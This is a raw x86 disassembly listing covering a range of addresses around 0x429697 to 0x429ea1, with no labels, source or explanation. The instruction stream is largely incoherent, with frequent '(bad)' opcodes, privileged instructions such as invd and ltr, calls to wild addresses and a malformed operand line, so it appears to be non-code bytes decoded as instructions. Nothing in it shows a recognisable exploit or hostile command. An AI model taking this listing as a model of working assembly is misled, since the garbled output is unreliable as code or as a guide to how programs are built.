  429697:	mov    ebx,DWORD PTR [eax]
  429699:	fcom   st(2)
  42969b:	add    BYTE PTR [edi],bl
  42969d:	lea    ecx,[eax-0x18]
  4296a0:	(bad)  
  4296a1:	push   DWORD PTR [ecx]
  4296a3:	call   0xffb4e405
  4296a8:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4296ac:	fstp   DWORD PTR [esi+ebx*8]
  4296af:	push   ebp
  4296b0:	pop    ebp
  4296b1:	mov    esi,DWORD PTR [edx-0x38]
  4296b4:	add    DWORD PTR [eax],0x28
  4296b7:	mov    edi,DWORD PTR [ebx]
  4296b9:	xor    esi,DWORD PTR [edx+0x3]
  4296bc:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  4296c0:	pop    ebp
  4296c1:	or     al,0x4
  4296c3:	inc    ecx
  4296c4:	push   ebp
  4296c5:	(bad)  
  4296c6:	in     al,dx
  4296c7:	or     ah,ch
  4296c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4296ca:	xbegin 0xffc80cc0
  4296d0:	clc    
  4296d1:	adc    al,0x45
  4296d3:	idiv   BYTE PTR [ecx]
  4296d5:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4296dc:	test   DWORD PTR [eax+0x665300f8],ebx
  4296e2:	add    BYTE PTR [ecx+0x66],dh
  4296e5:	add    eax,DWORD PTR [ebp+0x52]
  4296e8:	adc    eax,0x20
  4296eb:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4296f1:	test   DWORD PTR [eax],eax
  4296f3:	clc    
  4296f4:	data16 or al,BYTE PTR [ebp+0x45]
  4296f8:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4296ff:	rol    BYTE PTR [ebp+0x45],1
  429702:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  429708:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  42970e:	push   ebx
  42970f:	add    BYTE PTR [eax+0x0],dl
  429712:	push   ecx
  429713:	jge    0x429748
  429715:	add    BYTE PTR [esi+0x4],dl
  429718:	jne    0x42977f
  42971a:	mov    edx,0x457200
  42971f:	jmp    0x4296e3
  429721:	xor    edi,DWORD PTR [ebx]
  429723:	pop    edi
  429724:	cvtdq2ps xmm7,xmm0
  429727:	ret    0x0
  42972a:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  429730:	xor    ecx,DWORD PTR [edi]
  429732:	add    eax,DWORD PTR [ecx+0x3b]
  429735:	push   ebx
  429736:	rdpmc  
  429738:	out    0x8d,al
  42973a:	add    BYTE PTR [eax],cl
  42973c:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  429742:	ret    0x450c
  429745:	sbb    al,0x8b
  429747:	cmp    eax,esi
  429749:	or     cl,al
  42974b:	or     al,0xc2
  42974d:	pop    eax
  42974e:	inc    ebp
  42974f:	add    ecx,DWORD PTR [edi]
  429751:	add    esi,DWORD PTR [ebp+0x39]
  429754:	invd   
  429756:	jge    0x429762
  429758:	mov    eax,0x478ac0
  42975d:	cli    
  42975e:	xor    esp,ecx
  429760:	mov    ebx,0x5b8ac0
  429765:	ret    0x33
  429768:	mov    eax,0x833a8b
  42976d:	sub    BYTE PTR [ebx],al
  42976f:	inc    ebp
  429770:	data16 cmp al,bh
  429773:	pushf  
  429774:	inc    bh
  429776:	mov    esp,esp
  429778:	hlt    
  429779:	test   DWORD PTR [ebp-0x8],esi
  42977c:	mov    eax,DWORD PTR [ebp-0x14]
  42977f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429785:	dec    edi
  429786:	or     BYTE PTR [eax],al
  429788:	jne    0x429713
  42978a:	mov    esi,esp
  42978c:	call   0x77a92351
  429791:	inc    ebp
  429792:	mov    DWORD PTR [eax+0x984f0c],edi
  429798:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42979e:	add    BYTE PTR [esi+0x7d],ah
  4297a1:	inc    ebp
  4297a2:	mov    bx,WORD PTR [ebp+0x8]
  4297a6:	add    DWORD PTR [ebp+0x50],0x30c008b
  4297ad:	inc    ebp
  4297ae:	mov    bx,di
  4297b1:	lock test BYTE PTR [ecx+0x7000801],bh
  4297b8:	jge    0x42977b
  4297ba:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  4297c0:	cli    
  4297c1:	xor    bl,bh
  4297c3:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4297c9:	test   BYTE PTR [eax],cl
  4297cb:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4297d2:	cmp    ebp,eax
  4297d4:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4297db:	test   BYTE PTR [ebp+0x1],bh
  4297de:	mov    ebx,0x458a00
  4297e3:	xor    esi,DWORD PTR [ebx]
  4297e5:	add    esp,DWORD PTR [esi-0x77]
  4297e8:	pop    ebp
  4297e9:	loopne 0x429851
  4297eb:	inc    ebp
  4297ec:	clc    
  4297ed:	xor    edi,DWORD PTR [ebx]
  4297ef:	add    esi,DWORD PTR [edx-0x77]
  4297f2:	data16 fdivr QWORD PTR [ebp-0x49]
  4297f6:	mov    ebx,0xb78afc
  4297fb:	hlt    
  4297fc:	xor    esi,DWORD PTR [esi]
  4297fe:	data16 add BYTE PTR [ebp+0x66],bl
  429802:	data16 lock clc 
  429805:	cmp    eax,DWORD PTR ss:[eax]
  429808:	ja     0x429870
  42980a:	psubq  mm7,QWORD PTR [ebp-0x4]
  42980e:	ltr    WORD PTR [ebp+0x66]
  429812:	add    esi,eax
  429814:	add    di,WORD PTR [ebp+0x2b]
  429818:	data16 data16 jge 0x429899
  42981c:	mov    ebx,0xe08a8b
  429821:	jge    0x429856
  429823:	data16 data16 xor al,0x5d
  429827:	data16 data16 jne 0x429823
  42982b:	mov    edi,DWORD PTR [ebx]
  42982d:	fdiv   QWORD PTR [edx+0x7d]
  429830:	data16 data16 jge 0x429868
  429834:	mov    ebx,0x758a66
  429839:	mov    esi,0x667233
  42983e:	pop    ebp
  42983f:	or     BYTE PTR [esi+0x0],ah
  429842:	clc    
  429843:	mov    edi,DWORD PTR [ebx]
  429845:	lock ja 0x4297d3
  429848:	(bad)  
  42984a:	jge    0x429843
  42984c:	invd   
  42984e:	pop    ebp
  42984f:	add    BYTE PTR [ebx],al
  429851:	(bad)  
  429852:	cmp    di,WORD PTR [ebp+0xf]
  429856:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42985a:	mov    bx,WORD PTR [ebp-0x10]
  42985e:	pop    bp
  429860:	fbstp  TBYTE PTR [ebx]
  429862:	test   DWORD PTR [ebx],eax
  429864:	add    BYTE PTR [ebx],bh
  429866:	add    BYTE PTR [esi+0x7d],ah
  429869:	jge    0x4297f6
  42986b:	data16 in al,dx
  42986d:	pop    ebp
  42986e:	stc    
  42986f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429876:	mov    edi,ebx
  429878:	in     al,dx
  429879:	test   BYTE PTR [ebp+0x0],bh
  42987c:	mov    eax,DWORD PTR [eax]
  42987e:	call   0xbd3f920e
  429883:	ss cwde 
  429885:	add    BYTE PTR [edx],dh
  429887:	mov    bx,di
  42988a:	call   0x8b4b161a
  42988f:	add    ebp,esp
  429891:	mov    bx,di
  429894:	jnp    0x4298bc
  429896:	mov    DWORD PTR [ebx+0x367df808],ecx
  42989c:	mov    eax,DWORD PTR [eax]
  42989e:	call   0x7c3e2409
  4298a3:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4298a9:	data16 data16 fistp WORD PTR [ebp+0xe]
  4298ae:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  4298b8:	fisttp WORD PTR [ecx-0x7401f77b]
  4298be:	(bad)  
  4298bf:	cld    
  4298c0:	jne    0x4298f8
  4298c2:	xor    eax,DWORD PTR [eax]
  4298c4:	mov    esp,DWORD PTR [esi-0x10]
  4298c7:	sti    
  4298c8:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4298cf:	data16 adc bl,bh
  4298d2:	push   ebp
  4298d3:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  4298da:	mov    WORD PTR [eax],es
  4298dc:	cwde   
  4298dd:	data16 xor bh,bl
  4298e0:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4298e6:	mov    esp,DWORD PTR [esi-0x14]
  4298e9:	fisttp WORD PTR [ebx-0x3748a9f2]
  4298ef:	or     al,0x2b
  4298f1:	mov    bh,0xba
  4298f3:	hlt    
  4298f4:	mov    bh,bl
  4298f6:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4298fc:	dec    edi
  4298fd:	or     al,0x0
  4298ff:	mov    edi,DWORD PTR [ebx]
  429901:	or     BYTE PTR [ebp+0x3b],dh
  429904:	mov    ecx,DWORD PTR [edi]
  429906:	fdivr  QWORD PTR [ebx-0x7499ff83]
  42990c:	xor    al,0xd8
  42990e:	pop    bp
  429910:	lock xor esi,DWORD PTR [ebx]
  429913:	lea    esp,[esi+0x1f]
  429916:	icebp  
  429917:	jb     0x42991d
  429919:	add    al,al
  42991b:	jge    0x429929
  42991d:	mov    eax,eax
  42991f:	fsubr  st,st(3)
  429921:	pop    ebp
  429922:	mov    esi,DWORD PTR [ebx]
  429924:	in     al,0x8d
  429926:	rcr    DWORD PTR [edi],0xc2
  429929:	jb     0x429989
  42992b:	add    cl,cl
  42992d:	jge    0x42993b
  42992f:	mov    edx,DWORD PTR [ebp-0x20]
  429932:	in     al,dx
  429933:	pop    ebp
  429934:	data16 data16 or BYTE PTR [esi+edi*4],bh
  429939:	data16 cmp bh,BYTE PTR [ebp+0x0]
  42993d:	mov    ebp,DWORD PTR [ebx]
  42993f:	fdivr  QWORD PTR [esi+0x668a5d]
  429945:	cmp    al,0x33
  429947:	mov    si,0x4f7d
  42994b:	mov    eax,DWORD PTR [eax]
  42994d:	lock inc ebp
  42994f:	mov    esi,DWORD PTR [edi]
  429951:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  429958:	clc    
  429959:	(bad)  
  42995a:	cmp    edi,DWORD PTR [ebx]
  42995c:	je     0x42996d
  42995e:	push   ebx
  42995f:	loopne 0x429970
  429961:	dec    ecx
  429963:	mov    ebp,DWORD PTR [eax-0x1c]
  429966:	int    0xf1
  429968:	mov    esi,0x703084d
  42996d:	orps   xmm6,xmm1
  429970:	add    BYTE PTR [ebp+0x66],dh
  429973:	jmp    0x429940
  429975:	mov    eax,DWORD PTR [ebx]
  429977:	lock push ebp
  429979:	ror    DWORD PTR [ebp-0x2972feb3],1
  42997f:	or     bh,dl
  429981:	jb     0x429981
  429983:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429989:	loopne 0x42998b
  42998b:	jne    0x429989
  42998d:	data16 add BYTE PTR [esi+eiz*2],dh
  429991:	mov    ecx,ebx
  429993:	data16 ss icebp 
  429996:	add    BYTE PTR [esi],dh
  429998:	data16 add bl,cl
  42999b:	data16 xor dh,dl
  42999e:	add    BYTE PTR [edx],dh
  4299a0:	data16 add bl,cl
  4299a3:	enterw 0x4df1,0x19
  4299a8:	pop    edi
  4299a9:	jne    0x42992c
  4299ab:	mov    esi,DWORD PTR [edi]
  4299ad:	call   0x77b7254e
  4299b2:	xor    ebp,DWORD PTR [ebx]
  4299b4:	lea    esp,[esi+0x48]
  4299b7:	repnz in eax,0x3b
  4299ba:	add    BYTE PTR [ebp-0x37],dh
  4299bd:	xor    edx,DWORD PTR [ebp-0x15]
  4299c0:	in     al,dx
  4299c1:	xor    edx,DWORD PTR [esi+0x40]
  4299c4:	mov    DWORD PTR [edi],0x338545fc
  4299ca:	clc    
  4299cb:	add    edi,DWORD PTR [eax]
  4299cd:	pop    edi
  4299ce:	pushf  
  4299cf:	pop    ebx
  4299d0:	call   0xff439997
  4299d5:	mov    edi,eax
  4299d7:	push   ecx
  4299d8:	pop    es
  4299d9:	mov    edi,DWORD PTR [ebx]
  4299db:	push   esi
  4299dc:	inc    ebx
  4299dd:	cld    
  4299de:	js     0x4299e0
  4299e0:	popa   
  4299e1:	data16 (bad) 
  4299e3:	into   
  4299e4:	push   0xb900cd36
  4299e9:	data16 or dh,cl
  4299ec:	pop    es
  4299ed:	xor    ah,BYTE PTR [esi+0x0]
  4299f0:	add    bh,al
  4299f2:	cld    
  4299f3:	cld    
  4299f4:	add    BYTE PTR [ebp+0x38c3f866],al
  4299fa:	ss pushf 
  4299fc:	add    BYTE PTR [esi+0x66],ah
  4299ff:	into   
  429a00:	ret    
  429a01:	pop    ebp
  429a02:	add    al,0x57
  429a04:	add    BYTE PTR [edi-0x723c409a],dh
  429a0a:	add    edi,edi
  429a0c:	jne    0x429a5e
  429a0e:	lea    edx,[ecx+0x1]
  429a11:	mov    ebx,0xd64ff1
  429a16:	sar    DWORD PTR [ebx],1
  429a18:	test   BYTE PTR [ebp+0x30],dh
  429a1b:	mov    DWORD PTR [esp+edi*8-0x76],esp
  429a1f:	push   edi
  429a20:	xor    BYTE PTR [ebx],0x3b
  429a23:	mov    esi,ebx
  429a25:	xor    eax,DWORD PTR [eax-0x3c73879a]
  429a2b:	xor    BYTE PTR [ebp+0x64],al
  429a2e:	pop    ebx
  429a2f:	mov    ebx,0x9c3a37
  429a34:	je     0x429a61
  429a36:	xor    edi,DWORD PTR [ebx+0x668a33]
  429a3c:	mov    WORD PTR [ebx],?
  429a3e:	xor    BYTE PTR [ebx+0x8b4f64],bh
  429a44:	pop    edi
  429a45:	cmp    ecx,ecx
  429a47:	jne    0x429a9e
  429a49:	mov    ebp,esp
  429a4b:	cld    
  429a4c:	push   esi
  429a4d:	pop    ebx
  429a4e:	inc    ebp
  429a4f:	stc    
  429a50:	aaa    
  429a51:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  429a58:	clc    
  429a59:	test   dl,dl
  429a5b:	xor    bh,bh
  429a5d:	fs pop si
  429a60:	or     bl,al
  429a62:	cld    
  429a63:	mov    eax,DWORD PTR [eax]
  429a65:	push   ecx
  429a66:	push   di
  429a68:	retf   0x3645
  429a6b:	aaa    
  429a6c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429a73:	clc    
  429a74:	add    BYTE PTR [ebx+0x66],bl
  429a77:	dec    edx
  429a79:	mov    edx,DWORD PTR [edi-0x76]
  429a7c:	push   edi
  429a7d:	add    al,0xb7
  429a7f:	xor    al,0xba
  429a81:	cmp    al,0x8d
  429a83:	je     0x429a84
  429a85:	mov    edx,DWORD PTR [eax-0x46]
  429a88:	push   ecx
  429a89:	lea    edi,[ebx+0x504fff]
  429a8f:	push   ecx
  429a90:	cmp    edx,DWORD PTR [ebx+0x75]
  429a93:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429a99:	add    BYTE PTR [ebx],dh
  429a9b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429aa1:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429aa8:	mov    ebx,0x3b3a00
  429aad:	jne    0x429ada
  429aaf:	mov    DWORD PTR [ebx+0x728afc],edi
  429ab5:	xor    esi,DWORD PTR [ebx]
  429ab7:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  429abd:	push   edi
  429abe:	cmp    esp,ebp
  429ac0:	jne    0x429ac2
  429ac2:	sbb    DWORD PTR [eax],0x8085c3fc
  429ac8:	clc    
  429ac9:	inc    ebx
  429aca:	pop    ebx
  429acb:	sti    
  429acc:	add    eax,0xeb8bc075
  429ad1:	cld    
  429ad2:	xor    edi,DWORD PTR ds:0xf8c3855e
  429ad8:	mov    ecx,DWORD PTR [ecx+edx*2]
  429adb:	rol    DWORD PTR [ebp-0x37],0xf
  429adf:	mov    DWORD PTR [eax],ecx
  429ae1:	inc    edi
  429ae2:	(bad)  
  429ae3:	in     eax,0x4
  429ae5:	add    bh,bh
  429ae7:	(bad)  
  429ae8:	mov    esi,0xc38a5e
  429aed:	mov    esi,DWORD PTR [ebx]
  429aef:	push   ecx
  429af0:	mov    edi,0xfc4fc7
  429af5:	test   DWORD PTR [ebp-0x8],edx
  429af8:	data16 cmp bh,al
  429afb:	pushf  
  429afc:	sub    ebp,eax
  429afe:	inc    ebp
  429aff:	(bad)  
  429b00:	sub    edi,edi
  429b02:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  429b08:	inc    ebp
  429b09:	add    BYTE PTR [esi+0x2b],ah
  429b0c:	or     bh,BYTE PTR [edx+0xf8ac2]
  429b12:	cmp    al,0x33
  429b14:	mov    edi,DWORD PTR [edx+0x44f81]
  429b1a:	(bad)  
  429b1b:	cmp    esi,DWORD PTR [ebx]
  429b1d:	je     0x429ad7
  429b1f:	push   ebx
  429b20:	dec    edi
  429b21:	str    ecx
  429b24:	cmp    ebp,DWORD PTR [eax+0x75]
  429b27:	int    0x33
  429b29:	mov    edi,0x789085f
  429b2e:	mov    eax,DWORD PTR [esp+edi*8]
  429b31:	add    cl,cl
  429b33:	data16 add al,0xcb
  429b36:	push   ebp
  429b37:	add    ebp,esp
  429b39:	jne    0x429b27
  429b3b:	(bad)  
  429b3c:	mov    DWORD PTR [ecx],0xd685f7ec
  429b42:	clc    
  429b43:	xlat   BYTE PTR ds:[ebx]
  429b44:	inc    ebp
  429b45:	mov    edi,DWORD PTR [ecx]
  429b47:	push   eax
  429b48:	pushf  
  429b49:	in     eax,0x8b
  429b4b:	add    ah,ch
  429b4d:	cld    
  429b4e:	push   eax
  429b4f:	add    BYTE PTR [ecx+0x66],dl
  429b52:	add    eax,0x3672cb
  429b57:	add    BYTE PTR [ebp+0x66],al
  429b5a:	(bad)  
  429b5b:	retf   
  429b5c:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429b63:	retf   
  429b64:	cmp    al,0xc8
  429b66:	pushf  
  429b67:	jge    0x429b30
  429b69:	aaa    
  429b6a:	cld    
  429b6b:	pushf  
  429b6c:	test   DWORD PTR [edi-0x8],ebx
  429b6f:	je     0x429bb6
  429b71:	xor    esi,DWORD PTR ds:0x7020840
  429b77:	ror    BYTE PTR [ebp-0x37],0x8d
  429b7b:	push   ebp
  429b7c:	add    esp,ebp
  429b7e:	jb     0x429b0b
  429b80:	add    BYTE PTR [eax],cl
  429b82:	dec    ebp
  429b83:	mov    bh,0x81
  429b85:	push   esi
  429b86:	push   eax
  429b87:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  429b8e:	xor    al,BYTE PTR [eax]
  429b90:	mov    edx,DWORD PTR [edi+0x10]
  429b93:	(bad)  
  429b94:	scas   eax,DWORD PTR es:[edi]
  429b95:	xor    bh,BYTE PTR [ebx]
  429b97:	add    BYTE PTR [edi],cl
  429b99:	mov    ebp,ebp
  429b9b:	cld    
  429b9c:	add    BYTE PTR [ebx],bh
  429b9e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429ba2:	dec    ebp
  429ba3:	or     BYTE PTR [ebx],ch
  429ba5:	ret    0x458b
  429ba8:	lock jmp 0x429b9c
  429bab:	mov    ecx,DWORD PTR [eax]
  429bad:	or     BYTE PTR [edi],al
  429baf:	mov    ecx,eax
  429bb1:	xor    DWORD PTR [edx+0x2],0x0
  429bb5:	mov    bh,0xc1
  429bb7:	adc    BYTE PTR [eax],dh
  429bb9:	iret   
  429bba:	inc    ebp
  429bbb:	mov    DWORD PTR [ebx],0x4dfff8c5
  429bc1:	inc    BYTE PTR [ebx]
  429bc3:	xor    bh,al
  429bc5:	add    BYTE PTR [ecx],dl
  429bc7:	data16 adc al,bh
  429bca:	dec    ecx
  429bcb:	fisttp WORD PTR [ecx+0x456604c0]
  429bd1:	add    dh,BYTE PTR ds:0x75e0845
  429bd7:	ret    0x4d
  429bda:	lea    ecx,[ebx+0x18728301]
  429be0:	add    BYTE PTR [ebp+0x45],al
  429be3:	cmp    cl,ch
  429be5:	pushf  
  429be6:	add    bh,al
  429be8:	add    al,ch
  429bea:	inc    ebp
  429beb:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429bf1:	xor    eax,0x781084d
  429bf6:	push   eax
  429bf7:	cwde   
  429bf8:	push   ecx
  429bf9:	xor    al,BYTE PTR [ecx+0x32f89889]
  429bff:	inc    ebp
  429c00:	cmp    esp,DWORD PTR [eax]
  429c02:	jbe    0x429ba0
  429c04:	mov    eax,edi
  429c06:	or     ah,dh
  429c08:	inc    ebp
  429c09:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  429c0f:	cmp    cl,BYTE PTR [ebx-0x74747664]
  429c15:	in     al,dx
  429c16:	hlt    
  429c17:	push   eax
  429c18:	push   eax
  429c19:	push   ecx
  429c1a:	push   ecx
  429c1b:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  429c21:	cwde   
  429c22:	cwde   
  429c23:	xor    dh,BYTE PTR [edx]
  429c25:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  429c2b:	or     BYTE PTR [ebp+0x7],al
  429c2e:	mov    eax,ecx
  429c30:	clc    
  429c31:	jb     0x429bf4
  429c33:	add    BYTE PTR [ebp+0x55],cl
  429c36:	or     DWORD PTR [edi],0xc251d150
  429c3c:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  429c46:	mov    edi,eax
  429c48:	or     cl,al
  429c4a:	inc    ebp
  429c4b:	dec    ebp
  429c4c:	mov    eax,DWORD PTR [ecx+0x514d500c]
  429c52:	or     WORD PTR [ecx],0x8998
  429c57:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  429c5d:	mov    edx,DWORD PTR [ecx+0x8]
  429c60:	mov    eax,DWORD PTR [ebp-0x8]
  429c63:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429c6a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429c70:	inc    ebp
  429c71:	dec    eax
  429c72:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429c78:	add    edx,DWORD PTR [ecx-0x8]
  429c7b:	mov    ecx,DWORD PTR [ecx]
  429c7d:	clc    
  429c7e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429c85:	mov    ecx,ebp
  429c87:	clc    
  429c88:	(bad)  
  429c89:	popf   
  429c8a:	inc    DWORD PTR [eax]
  429c8c:	ret    0x8b
  429c8f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429c95:	mov    edi,esp
  429c97:	hlt    
  429c98:	test   ecx,esi
  429c9a:	clc    
  429c9b:	or     BYTE PTR [ebp+0x7],al
  429c9e:	cmp    ecx,eax
  429ca0:	pushf  
  429ca1:	jb     0x429cd6
  429ca3:	add    BYTE PTR [eax-0x3f],al
  429ca6:	inc    eax
  429ca7:	daa    
  429ca8:	inc    ebp
  429ca9:	inc    ebp
  429caa:	xor    eax,0x7f80803
  429caf:	dec    ebp
  429cb0:	cwde   
  429cb1:	add    esi,DWORD PTR [edx]
  429cb3:	clc    
  429cb4:	cmp    DWORD PTR [ecx],ecx
  429cb6:	or     al,0x8
  429cb8:	add    al,BYTE PTR [ebp+0x2c]
  429cbb:	xor    eax,0x7350845
  429cc0:	or     BYTE PTR [ebp+0x7],cl
  429cc3:	lea    ebx,[eax-0x748dcdff]
  429cc9:	add    BYTE PTR [eax*2-0x74b21438],cl
  429cd0:	mov    edx,DWORD PTR [eax]
  429cd2:	cld    
  429cd3:	dec    ebp
  429cd4:	push   eax
  429cd5:	sub    edx,DWORD PTR [ecx-0x75]
  429cd8:	add    eax,0xf172fc
  429cdd:	or     BYTE PTR [ebp+0x7],cl
  429ce0:	add    eax,ecx
  429ce2:	or     al,0x72
  429ce4:	add    DWORD PTR [eax],eax
  429ce6:	mov    ebx,0x29c2c1
  429ceb:	inc    ebp
  429cec:	mov    eax,DWORD PTR [ebx]
  429cee:	cmp    eax,0x3004d1c
  429cf4:	xbegin 0x66c828ee
  429cfa:	clc    
  429cfb:	or     BYTE PTR [ebp+0x45],al
  429cfe:	cmp    DWORD PTR ds:0x78b089c,esi
  429d04:	adc    BYTE PTR [ebp+0x45],cl
  429d07:	lea    eax,[ebp+0x33727501]
  429d0d:	add    cl,ch
  429d0f:	inc    ebp
  429d10:	add    bl,ch
  429d12:	add    BYTE PTR [ebx+0x45850845],cl
  429d18:	je     0x429ca5
  429d1a:	push   ebx
  429d1b:	or     al,0x85
  429d1d:	dec    ebp
  429d1e:	std    
  429d1f:	mov    bh,bh
  429d21:	mov    BYTE PTR [ebp-0x75],al
  429d24:	mov    edi,eax
  429d26:	or     al,0x89
  429d28:	inc    ebp
  429d29:	clc    
  429d2a:	mov    esp,esp
  429d2c:	hlt    
  429d2d:	call   DWORD PTR [edi-0x37]
  429d30:	push   eax
  429d31:	or     al,0x51
  429d33:	push   ebp
  429d34:	xor    ebp,esp
  429d36:	mov    esi,0x457251
  429d3b:	cmp    dh,al
  429d3d:	pushf  
  429d3e:	inc    ebp
  429d3f:	(bad)  
  429d40:	mov    edi,eax
  429d42:	or     al,0x85
  429d44:	add    al,bh
  429d46:	inc    eax
  429d48:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429d4c:	or     ah,bh
  429d4e:	inc    eax
  429d4f:	push   eax
  429d50:	jmp    0x429da3
  429d52:	mov    eax,DWORD PTR ds:0xe8720c
  429d58:	mov    DWORD PTR [ebp-0x8],eax
  429d5b:	jne    0x429da2
  429d5d:	jmp    0x429cea
  429d5f:	mov    ebp,DWORD PTR [eax]
  429d61:	clc    
  429d62:	retf   0xff50
  429d65:	push   ecx
  429d66:	mov    DWORD PTR ds:0x757210,eax
  429d6c:	mov    ecx,DWORD PTR [ebp-0x4]
  429d6f:	sub    esp,DWORD PTR [ebx-0x77]
  429d72:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429d79:	or     ah,bh
  429d7b:	pop    es
  429d7c:	ds cwde 
  429d7e:	push   DWORD PTR [edx]
  429d80:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429d86:	(bad)  
  429d87:	mov    bh,bh
  429d89:	jmp    0x429d77
  429d8b:	leave  
  429d8c:	jne    0x429d96
  429d8e:	call   0x2f96e8
  429d93:	in     al,dx
  429d94:	dec    ebp
  429d95:	add    dh,BYTE PTR [ebx]
  429d97:	add    BYTE PTR [ebx],al
  429d99:	inc    ebp
  429d9a:	cmp    edi,DWORD PTR [eax]
  429d9c:	je     0x429d3a
  429d9e:	mov    eax,edi
  429da0:	or     al,0xf0
  429da2:	add    BYTE PTR [ebp+0x458bf845],al
  429da8:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429dae:	adc    al,0x7
  429db0:	enter  0x9fc0,0xa5
  429db4:	rol    BYTE PTR [eax],0x5e
  429db7:	mov    ecx,ecx
  429db9:	or     al,0xc
  429dbb:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429dc2:	jmp    0x429dc3
  429dc4:	push   ebp
  429dc5:	mov    esp,ebp
  429dc7:	cld    
  429dc8:	inc    ebp
  429dc9:	inc    ebp
  429dca:	or     DWORD PTR [ecx+0x457dec10],0x0
  429dd1:	push   esi
  429dd2:	push   esi
  429dd3:	mov    edi,0x7af080f
  429dd8:	add    bh,al
  429dda:	test   DWORD PTR [eax+0x3a7320f],ebx
  429de0:	add    BYTE PTR [ecx+0x4540100f],cl
  429de6:	mov    ebp,eax
  429de8:	mov    ebp,edi
  429dea:	lock call edx
  429ded:	fcom   DWORD PTR [ebp+0x45]
  429df0:	mov    eax,0x148a8b
  429df5:	push   ecx
  429df6:	enter  0xc145,0x83
  429dfa:	cmp    cl,BYTE PTR [eax]
  429dfc:	add    BYTE PTR [ebp+0x4d],al
  429dff:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429e05:	call   0xffa29974
  429e0a:	cmp    eax,DWORD PTR [ebp-0xc]
  429e0d:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429e11:	push   ebp
  429e12:	(bad)
  429e15:	std    
  429e16:	lock push DWORD PTR [edi+0x5d08fcdb]
  429e1d:	inc    ebp
  429e1e:	(bad)  
  429e1f:	call   0xff7c9aaf
  429e24:	add    al,BYTE PTR [ebp+0x37]
  429e27:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429e2d:	jne    0x429e2f
  429e2f:	(bad)  
  429e30:	cmp    edi,esp
  429e32:	jne    0x429e65
  429e34:	mov    edi,edi
  429e36:	or     BYTE PTR [ebx-0x307f0b49],cl
  429e3c:	pop    ds
  429e3d:	into   
  429e3e:	je     0x429e01
  429e40:	mov    ebx,DWORD PTR [esi]
  429e42:	or     BYTE PTR [ebp-0x49],al
  429e45:	mov    esp,DWORD PTR [esi-0x77]
  429e48:	mov    esi,0xfc451f0c
  429e4d:	mov    eax,DWORD PTR [eax]
  429e4f:	or     al,0x66
  429e51:	sar    bl,0x3b
  429e54:	xor    esi,DWORD PTR [ebp+0x66]
  429e57:	xor    ecx,edi
  429e59:	pop    edi
  429e5a:	adc    bl,BYTE PTR [ebx+0x78]
  429e5d:	ret    0xff
  429e60:	cld    
  429e61:	inc    ebp
  429e62:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429e68:	cld    
  429e69:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429e70:	push   0xffffff83
  429e72:	pop    edi
  429e73:	or     BYTE PTR [ebp+0x53],dh
  429e76:	xorps  xmm1,xmm2
  429e79:	test   BYTE PTR [eax+eax*1],bh
  429e7c:	add    BYTE PTR [eax],al
  429e7e:	adc    eax,eax
  429e80:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429e88:	jmp    DWORD PTR [eax]
  429e8a:	ror    al,0x5e
  429e8d:	inc    ebp
  429e8e:	leave  
  429e8f:	xor    ecx,DWORD PTR [eax]
  429e91:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429e97:	add    ch,al
  429e99:	xor    edi,edi
  429e9b:	xor    DWORD PTR [ebx],0x660033fc
  429ea1:	mov    DWORD PTR [ebp-0xc],ecx
